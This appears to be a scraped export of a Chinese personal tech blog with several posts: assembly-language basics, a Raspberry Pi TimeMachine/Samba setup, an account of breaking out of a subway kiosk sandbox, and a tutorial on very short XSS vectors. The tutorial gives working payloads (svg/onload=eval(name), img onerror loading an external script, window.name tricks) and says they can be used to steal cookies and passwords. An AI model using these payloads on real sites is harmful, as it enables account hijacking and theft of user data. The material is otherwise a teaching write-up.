机器语言，顾名思义就是机器能看懂的语言，因为计算机智能看懂0和1，通电为1，没有通电为0，所以机器语言就是0和1组成的，也就是二进制。比如：01010000。\n汇编语言 而汇编语言就是机器语言的一种表达方式，便于程序员更好的去记忆理解。比如机器码为01010000对应的汇编指令就是PUSH AX。\n汇编语言包含两个部分：汇编指令、编译器指令（比如符号运算、伪指令等）。\n计算机是没有办法计算加减乘除运算符的，而加减乘除是通过编译器转换成计算机能够识别的逻辑运算符（或、与、非），然后利用这些逻辑运算符的组合达到加减乘除的一个效果。\n编译器 编译器的作用就是把汇编语言转换成机器能够识别的机器语言，可以大概理解编译器就是一个扫描仪，把汇编语言的指令对应相应的机器码翻译出来。\n它们大致的关系是：程序员编写汇编语言通过编译器转换汇编语言为机器语言后交给计算机执行。\n存储器 首先来了解存储器，为什么要了解存储器，因为学习汇编就是操作CPU与这些存储器进行交换数据，存储器不止是硬盘，CPU内部也有存储器、内存、bios、显卡都是存储器，每个存储单元可以存储1字节(Byte)，也就是等于8bit。而每个存储器都会被划分为若干个存储单元，而所有的储存单元都会被CPU看成是一个内存，比如01开始是BIOS，05开始是显卡等。，比如下图：\n内存是一个计算机仅次于CPU的硬件的，CPU无法直接读取硬盘中的数据，而是内存读取硬盘的数据后，CPU从内存中读取的。\n在*NIX系统中经常会看见一个叫swap的交换文件，这个文件就是虚拟内存，它的作用就是当内存满了后，把暂时不用的数据放在这个交换文件中，当你需要读取这部分数据的时候，内存会再次从虚拟内存中加载数据到内存中，所以从虚拟内存中实际上等于从硬盘加载数据，所以速度比较慢。\n指令和数据 指令和数据对于计算机来说都是一堆0和1，比如下面的一串机器码：\n1000100111011000：等于89D8H\n1000100111011000：等于MOV AX,BX\n上面两个同样的机器码确表达出了不同的意思，那么计算机如何来分辨我们这串机器码到底是数据还是指令？这个完全由我们来决定它是指令还是数据。\nCPU对存储器的读写 首先CPU与其他芯片都有电路线连接，而这些电路线一般称为总线，总线又分为三种，分别为：地址总线、控制总线、数据总线。而这三类总线，是CPU与其他芯片通讯的重要部件。\nCPU想要对存储器进行读写，必须通过三类通讯的交互，而这三类通讯是通过上面不同的总线进行通讯的：\n地址信息：如果不清楚储存单元的地址，就随便找一个，有可能把需要从bios中读取的数据变为从显卡中读取了。\n读写信息：通过读写信息，CPU才知道是读取指定地址的数据还是写入指定地址数据。\n数据信息：当上面两部分完成了，那么如果是读，就读取数据，如果是写就写入数据。\n知道了CPU如何进行数据的读写，而该去怎么操作计算机去执行这步的操作？通过机器码，比如：\nMOV AX,[3]\n翻译成机器码就等于：\n10100001 00000011 00000000\n当CPU接收到这条机器码就会执行我们上面代码所代表的操作。\n地址总线 CPU通过地址总线来对存储器进行寻址，比如要从03储存单元读取数据，那么地址总线上面传输的信息为：00000011。从这里就能知道如果地址总线越多表示的不同数字就越多，CPU寻址的范围就越大，因为一根地址总线可以表示0和1两种信息，那10根地址总线，寻址的就是2的10次方，等于1024，因为计算器从0开始计算，所以最小能表示0个，最大能表示1023个。\n数据总线 而数据总线有多少根也决定了CPU与其他存储器的传输能力，8088CPU数据总线有8根，所以一次性能传输8个二进制位，8086CPU数据总线有16根，所以一次性可以传输16个二进制位。\n比如要传输一个8D9AH数据，8088CPU需要分两次传输，第一次传输8D，第二次传输9A。而8086CPU只需要传输一次8D9A。所以数据总线的根数决定了数据的传输速度。\n控制总线 控制总线有多少根也决定了CPU对于储存器的控制能力，而需要注意的是控制总线指的是一个总称，控制总线是由几根不同的控制线构成的。\n而当读取信息的时候控制总线中有一个专门负责读取信号的控制线有低电平的时候表示读取。\n而写入数据的时候，同样控制总线中也有一根专门负责写入信号的控制线，当向它输出低电平的时候表示写入。\n","permalink":"https://wuyizhou.com/posts/learning-assembly-1/","summary":"前言 此文章如出现歧义或错误的地方请谅解，这篇文章是我在学习汇编的时候同时记录下来的笔记，然后通过教程的方式发表出来，因为通过这样的方式发表出来，可以锻炼自己的语言组织能力，并且能够把问题思考懂了，然后再通过初学者的角度来记录这片文章，从而巩固自己的知识。如果有任何错误歧义的地方，可以通过邮箱与我取得联系。\n为什么学习汇编？ 首先在现在用汇编语言来写用户层面上的应用是很少的了，当然也有一些应用比如驱动、boot loader等。既然已经很少有人用汇编写用户层面的应用了，但是为什么要学习？因为汇编语言是作用于硬件上工作的语言，有便于理解计算机工作的原理，以后学习高级语言更为有利，特别是对于反汇编、破解这一块的技术对汇编语言的学习是必须的。\n机器语言 机器语言，顾名思义就是机器能看懂的语言，因为计算机智能看懂0和1，通电为1，没有通电为0，所以机器语言就是0和1组成的，也就是二进制。比如：01010000。\n汇编语言 而汇编语言就是机器语言的一种表达方式，便于程序员更好的去记忆理解。比如机器码为01010000对应的汇编指令就是PUSH AX。\n汇编语言包含两个部分：汇编指令、编译器指令（比如符号运算、伪指令等）。\n计算机是没有办法计算加减乘除运算符的，而加减乘除是通过编译器转换成计算机能够识别的逻辑运算符（或、与、非），然后利用这些逻辑运算符的组合达到加减乘除的一个效果。\n编译器 编译器的作用就是把汇编语言转换成机器能够识别的机器语言，可以大概理解编译器就是一个扫描仪，把汇编语言的指令对应相应的机器码翻译出来。\n它们大致的关系是：程序员编写汇编语言通过编译器转换汇编语言为机器语言后交给计算机执行。\n存储器 首先来了解存储器，为什么要了解存储器，因为学习汇编就是操作CPU与这些存储器进行交换数据，存储器不止是硬盘，CPU内部也有存储器、内存、bios、显卡都是存储器，每个存储单元可以存储1字节(Byte)，也就是等于8bit。而每个存储器都会被划分为若干个存储单元，而所有的储存单元都会被CPU看成是一个内存，比如01开始是BIOS，05开始是显卡等。，比如下图：\n内存是一个计算机仅次于CPU的硬件的，CPU无法直接读取硬盘中的数据，而是内存读取硬盘的数据后，CPU从内存中读取的。\n在*NIX系统中经常会看见一个叫swap的交换文件，这个文件就是虚拟内存，它的作用就是当内存满了后，把暂时不用的数据放在这个交换文件中，当你需要读取这部分数据的时候，内存会再次从虚拟内存中加载数据到内存中，所以从虚拟内存中实际上等于从硬盘加载数据，所以速度比较慢。\n指令和数据 指令和数据对于计算机来说都是一堆0和1，比如下面的一串机器码：\n1000100111011000：等于89D8H\n1000100111011000：等于MOV AX,BX\n上面两个同样的机器码确表达出了不同的意思，那么计算机如何来分辨我们这串机器码到底是数据还是指令？这个完全由我们来决定它是指令还是数据。\nCPU对存储器的读写 首先CPU与其他芯片都有电路线连接，而这些电路线一般称为总线，总线又分为三种，分别为：地址总线、控制总线、数据总线。而这三类总线，是CPU与其他芯片通讯的重要部件。\nCPU想要对存储器进行读写，必须通过三类通讯的交互，而这三类通讯是通过上面不同的总线进行通讯的：\n地址信息：如果不清楚储存单元的地址，就随便找一个，有可能把需要从bios中读取的数据变为从显卡中读取了。\n读写信息：通过读写信息，CPU才知道是读取指定地址的数据还是写入指定地址数据。\n数据信息：当上面两部分完成了，那么如果是读，就读取数据，如果是写就写入数据。\n知道了CPU如何进行数据的读写，而该去怎么操作计算机去执行这步的操作？通过机器码，比如：\nMOV AX,[3]\n翻译成机器码就等于：\n10100001 00000011 00000000\n当CPU接收到这条机器码就会执行我们上面代码所代表的操作。\n地址总线 CPU通过地址总线来对存储器进行寻址，比如要从03储存单元读取数据，那么地址总线上面传输的信息为：00000011。从这里就能知道如果地址总线越多表示的不同数字就越多，CPU寻址的范围就越大，因为一根地址总线可以表示0和1两种信息，那10根地址总线，寻址的就是2的10次方，等于1024，因为计算器从0开始计算，所以最小能表示0个，最大能表示1023个。\n数据总线 而数据总线有多少根也决定了CPU与其他存储器的传输能力，8088CPU数据总线有8根，所以一次性能传输8个二进制位，8086CPU数据总线有16根，所以一次性可以传输16个二进制位。\n比如要传输一个8D9AH数据，8088CPU需要分两次传输，第一次传输8D，第二次传输9A。而8086CPU只需要传输一次8D9A。所以数据总线的根数决定了数据的传输速度。\n控制总线 控制总线有多少根也决定了CPU对于储存器的控制能力，而需要注意的是控制总线指的是一个总称，控制总线是由几根不同的控制线构成的。\n而当读取信息的时候控制总线中有一个专门负责读取信号的控制线有低电平的时候表示读取。\n而写入数据的时候，同样控制总线中也有一根专门负责写入信号的控制线，当向它输出低电平的时候表示写入。","title":"汇编语言学习笔记（一）：基础知识"},{"content":"最近一段时间感觉用移动硬盘备份Mac电脑很不方便，因为要把移动硬盘拿出来，还要插上电脑备份，看了一下AirPort，但是价钱太贵，况且只能用于Mac备份并不能用于其他的Samba服务等，感觉不太划算，于是打算自己做一个TimeMacheine以及samba服务，TimeMacheine服务主要用于Mac备份，而samba用于局域网内的电脑上的一些文件存放。\n准备工作： 1、树莓派\n2、移动硬盘\n3、5V电源适配器以及连接线\n4、无线USB网卡或者有线\n5、SD卡（新版本的是TF卡）\n6、操作系统，关于操作系统，你可以到raspberry官方网站进行下载并通过win32diskimager软件进行写入。\n在这里我自己的设备信息为： 1、树莓派2代\n2、西数移动硬盘2TB自带电源\n3、5V电源适配器以及连接线\n4、有线网络\n5、SD卡16GB金士顿\n6、raspbian操作系统\n查看自己的移动硬盘是否加载，lsblk结果： 1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 在这里我是把我的硬盘分为两个分区，/dev/sda1 为ntfs格式、/dev/sda2 为 hfs格式，如果你需要进行分区可以通过fdisk以及cfdisk进行分区。\n格式化分区： 1 mkfs.ntfs -v “samba” /dev/sda1 \u0026amp;\u0026amp; mkfs.hfsplus -v “timemacheine” /dev/sda2 准备timemacheine以及samba的挂载目录：\n1 mkdir /srv/samba mkdir /srv/timemacheine samba搭建 安装ntfs-3g，让raspberry支持ntfs格式\n1 apt-get install ntfs-3g 挂载分区到指定目录\n1 mount -t ntfs /dev/sda1 /srv/samba 查看是否成功挂载，lsblk结果：\n1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part /src/samba (已挂载成功) `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 安装samba 1 apt-get install samba samba-common-bin 修改samba配置文件\n1 vi /etc/samba/smb.conf 添加共享配置信息\n1 \\[BackupFolder\\] (共享名字) comment = Backup Folder path = /srv/samba (路径) valid users = @users force group = users create mask = 0660 directory mask = 0771 read only = no 添加samba用户\n1 useradd backuser -m -G userspasswd backuser smbpasswd -a backuser 重启服务\n1 /etc/init.d/samba restart timemachine搭建\n安装必要的软件： 1 apt-get install hfsplus hfsutils hfsprogs 挂载目录：\n1 mount -t hfsplus /dev/sda2 /src/timemacheine 修改目录的所属组、所有者：\n1 chown -R pi:pi /srv/timemacheine 查看是否成功挂载，lsblk结果：\n1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part /src/samba (已挂载成功) `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /src/timemacheine (已挂载成功) mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 安装Netatalk Netatalk 是一个开源的 AppleTalk 通信协议的实现，Linux 系统通过它可以充当 Mac 的文件服务器 、AppleTalk 路由、打印服务器等。 安装：\n1 apt-get install netatalk 把最先设置的目录添加到配置文件:\n1 echo “/srv/timemacheine ”TimeMacheine” options:tm” \u0026gt;\u0026gt; /etc/netatalk/AppleVolumes.default 或者\n1 vi /etc/netatalk/AppleVolumes.default 然后把/srv/timemacheine “TimeMacheine” options:tm 添加到最后 这里可以把samba服务器也设置进来，这样就可以统一访问\n1 vi /etc/netatalk/AppleVolumes.default 然后把/srv/samba “samba” options:tm 添加到最后\n安装avahi-daemon和libnss-mdns 添加Avahi工具让Mac电脑可以在Finder工具栏的共享里发现磁盘\n1 apt-get install avahi-daemon libnss-mdns 配置nsswitch.conf文件，在原有的hosts行后面添加 mdns\n1 hosts: files mdns4\\_minimal \\[NOTFOUND=return\\] dns mdns4 mdns 让Avahi在局域网广播AFP共享:\n1 vi /etc/avahi/services/afpd.service 添加如下内容\n1 \u0026lt;?xml version=”1.0″ standalone=’no’?\u0026gt; 2 \u0026lt;!\\-\\*-nxml-\\*-\\\u0026gt; 3 \u0026lt;!DOCTYPE service-group SYSTEM “avahi-service.dtd”\\\u0026gt; 4 \u0026lt;service-group\\\u0026gt; 5 \u0026lt;name replace-wildcards\\=\u0026#34;”yes”\u0026#34;\\\u0026gt;%h\u0026lt;/name\\\u0026gt; 6 \u0026lt;service\\\u0026gt; 7 \u0026lt;type\\\u0026gt;\\_afpovertcp.\\_tcp\u0026lt;/type\\\u0026gt; 8 \u0026lt;port\\\u0026gt;548\u0026lt;/port\\\u0026gt; 9 \u0026lt;/service\\\u0026gt; 10 \u0026lt;service\\\u0026gt; 11 \u0026lt;type\\\u0026gt;\\_device-info.\\_tcp\u0026lt;/type\\\u0026gt; 12 \u0026lt;port\\\u0026gt;0\u0026lt;/port\\\u0026gt; 13 \u0026lt;txt-record\\\u0026gt;model=Xserve\u0026lt;/txt-record\\\u0026gt; 14 \u0026lt;/service\\\u0026gt; 15 \u0026lt;/service-group\\\u0026gt; 重启avahi服务\n1 /etc/init.d/avahi-daemon restart ","permalink":"https://wuyizhou.com/posts/raspberrypi-timemachine-samba/","summary":"最近一段时间感觉用移动硬盘备份Mac电脑很不方便，因为要把移动硬盘拿出来，还要插上电脑备份，看了一下AirPort，但是价钱太贵，况且只能用于Mac备份并不能用于其他的Samba服务等，感觉不太划算，于是打算自己做一个TimeMacheine以及samba服务，TimeMacheine服务主要用于Mac备份，而samba用于局域网内的电脑上的一些文件存放。\n准备工作： 1、树莓派\n2、移动硬盘\n3、5V电源适配器以及连接线\n4、无线USB网卡或者有线\n5、SD卡（新版本的是TF卡）\n6、操作系统，关于操作系统，你可以到raspberry官方网站进行下载并通过win32diskimager软件进行写入。\n在这里我自己的设备信息为： 1、树莓派2代\n2、西数移动硬盘2TB自带电源\n3、5V电源适配器以及连接线\n4、有线网络\n5、SD卡16GB金士顿\n6、raspbian操作系统\n查看自己的移动硬盘是否加载，lsblk结果： 1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 在这里我是把我的硬盘分为两个分区，/dev/sda1 为ntfs格式、/dev/sda2 为 hfs格式，如果你需要进行分区可以通过fdisk以及cfdisk进行分区。","title":"树莓派实现TimeMachine以及samba服务"},{"content":"描述 作者：xsscript(原网名：crackkay)\n漏洞已经报国家漏洞平台，并已Fix漏洞，所以公布文章用于记录\n其实这个终端之前还有一个漏洞，没有报上来，过了一个月也就是今天，试了一下，不行了，应该修复了，但是今天又看见了一个漏洞，所以就报上来了，本来说照一个全过程的，但是后来保安问我在干什么，于是我就走了。漏洞可以直接进主机，还有很多文件。如果对于只是玩玩的人就没有什么，如果有心的话危害还是比较大吧。\n正文 首先连续点击那个什么广告的时候，会出现itunes播放器的错误，在这里，我点击了显示问题详细信息。\n我点击了里面给的两个连接，一个是超链接，一个是txt的连接。然后我点击了关闭程序，就会出现如下画面。\n然后下面就是一些列的操作和演示\n","permalink":"https://wuyizhou.com/posts/subway-entertainment-terminal-security/","summary":"描述 作者：xsscript(原网名：crackkay)\n漏洞已经报国家漏洞平台，并已Fix漏洞，所以公布文章用于记录\n其实这个终端之前还有一个漏洞，没有报上来，过了一个月也就是今天，试了一下，不行了，应该修复了，但是今天又看见了一个漏洞，所以就报上来了，本来说照一个全过程的，但是后来保安问我在干什么，于是我就走了。漏洞可以直接进主机，还有很多文件。如果对于只是玩玩的人就没有什么，如果有心的话危害还是比较大吧。\n正文 首先连续点击那个什么广告的时候，会出现itunes播放器的错误，在这里，我点击了显示问题详细信息。\n我点击了里面给的两个连接，一个是超链接，一个是txt的连接。然后我点击了关闭程序，就会出现如下画面。\n然后下面就是一些列的操作和演示","title":"成都地铁终端设备沙盒破解进入系统"},{"content":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;svg/onload=eval(name)\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S3:然后运行页面，测试结果如下：\n\u0026lt;i/onclick=URL=name\u0026gt;\nS1:上面的代码文译一下：\n\u0026lt;i/onclick=document.URL=window.name\u0026gt;\nS2:其实这段代码和上一段差不多多少，这里就不截图了，简单的讲解一下。通过点击执行事件把window.name的内容给document.URL然后执行javascript代码。那么我们可以怎么利用呢？\n存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;i/onclick=URL=name\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;img src=x onerror=eval(name)\u0026gt; S1:先把代码文译一下：\n\u0026lt;img src=x onerror=eval(window.name)\u0026gt;\nS2:邪恶的eval又来了。通过img元素的src属性出错，执行onerror事件，通过邪恶的eval执行window.name里面的代码。\nS3:那我们怎么来实现呢？\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; 站长统计 存在缺陷的XSS页面如下： \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;s.sx\u0026#34; onerror=eval(name) /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 其实有很多用法，当然你也可以直接:\n\u0026lt;img src=x onerror=eval(alert(1)) /\u0026gt;\n还可以\n\u0026lt;img src=x onerror=eval(变量) /\u0026gt;\n还可以通过调用元素属性，或者是程序员自写的js代码\n\u0026lt;img src=x onerror=with(body)createElement(\u0026#39;script\u0026#39;).src=\u0026#39;[JS地址]\u0026#39;\u0026gt; S1:通过img元素的src属性出错，执行onerror事件.\nS2:用with定位到body，通过DOM的一个createElement方法创建一个script元素，并使用script的src属性指向需要调用的外部js文件。从而达到攻击的目的。\nS3:这个就不讲解了，都应该能够看懂\n0x03 实例\n下面引用长谷川的PPT的一部分（此PPT引用经过作者同意）\n通过查看源代码：\n地址：\nhttps://*.live.com/?param=\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--#!html \u0026lt;!-- Version: \u0026#34;13.000.20177.00\u0026#34; Server: BAYIDSLEG1C38; DateTime: 2012/05/01 15:13:23 --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; value=\u0026#34;MESSAGE: A potentially dangerous Request.QueryString value was detected from the client (param=\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--\u0026#34;). SOURCE: System.Web FORM:\u0026#34; /\u0026gt; 找出了XSS的原因是由错误消息引起的XSS\n然后通过攻击者自己构造的页面构造XSS，并成功实现。\n\u0026lt;iframe src=\u0026#34;target\u0026#34; name=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt; （或者使用JavaScript的window.open） 最终：作者通过21个字符实现XSS（关于实现的方法请见上面的一些比较猥琐的利用元素标签）\n代码为：\n\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 当然22个字符也有很多方法(//后面为我们构造的代码开始) 20 Letters \u0026lt;input type=hidden 